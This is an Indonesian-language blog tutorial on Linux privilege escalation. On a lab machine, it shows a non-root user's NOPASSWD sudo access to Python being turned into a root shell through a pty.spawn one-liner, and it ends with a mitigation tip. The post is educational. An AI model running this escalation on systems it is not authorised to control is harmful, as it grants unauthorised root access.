---
title: "Privilages Escalation with Sudo"
date: 2019-06-21T13:26:36-04:00
categories:
- linux
tags:
- exploit
keywords:
- exploit
---

Pada dasarnya setiap sistem operasi dirancang untuk digunakan dengan banyak pengguna, tujuannya adalah agar sebuah sistem dapat digunakan oleh beberapa pengguna yang berbeda, adapun perbedaan hak akses atau kekuasaan yang dimiliki oleh setiap user. Contohnya saja di Linux ada user **root** yang memiliki hak akses tertinggi setara **Administrator** di Windows dengan user root atau Administrator jika di Windows ini kita bisa melakukan apa saja pada sistem Linux kita, berbeda dengan user biasa (Non root) yang memiliki kekuasaan terbatas.

Privilages Escalation adalah teknik yang digunakan untuk peningkatan hak akses dari user biasa (Non root) ke user yang lebih tinggi haknya seperti root di Linux dan administrator di Windows, biasanya teknik ini digunakan oleh para attacker untuk meningkatkan hak mereka setelah berhasil masuk ke sebuah sistem tetapi dengan user yang memiliki hak akses terbatas, biasanya privilages escalation dilakukan dengan memanfaatkan kesalahan kofigurasi yang dilakukan oleh seorang SysAdmin dan memanfaatkan BUG/celah yang ada pada sistem tersebut misalnya exploit kernel.

### Privilages Escalation memanfaatkan akses Sudo

Pada tulisan saya kali ini akan membahas Privilages Escalation dengan memanfaatkan akses sudo pada user Non-root di Linux, langsung saja kita uji coba.
Login ke mesin Linux kita dengan user non-root.

	adam@lab-01:~$ id
	uid=1000(adam) gid=1000(adam) groups=1000(adam),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),108(netdev),1001(human)
	adam@lab-01:~$ whoami 
	adam
	adam@lab-01:~$ 

Sebagai contoh di atas, saya login ke Linux dengan user adam (non-root).
Cek akses sudo:

	adam@lab-01:~$ sudo -l
	sudo: unable to resolve host lab-01: Connection refused
	Matching Defaults entries for adam on lab-01:
	    env_reset, mail_badpass,
	    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
	,													
	User adam may run the following commands on lab-01:
	    (root) NOPASSWD: /usr/bin/python, /tmp/get_root.py
	adam@lab-01:~$ 

Terlihat jelas bahwa user adam bisa mengeksekusi `/usr/bin/python` tanpa password root, maka bisa kita manfaatkan untuk meningkatkan hak akses ke root dengan shell spawn python mode root.

get root with python:

	adam@lab-01:~$ sudo python -c 'import pty; pty.spawn("/bin/bash")'
	root@lab-01:/home/adam# 

BOOOOM!!! maka secara langsung kita mendapatkan akses root
<blockquote>
<p>Note: Ini terjadi karena user adam bisa menjalankan perintah python tanpa password, maka penanganannya adalah jangan berikan akese ke bahasa pemrograman apapun seperti python, PHP, Perl dll.</p>
</blockquote>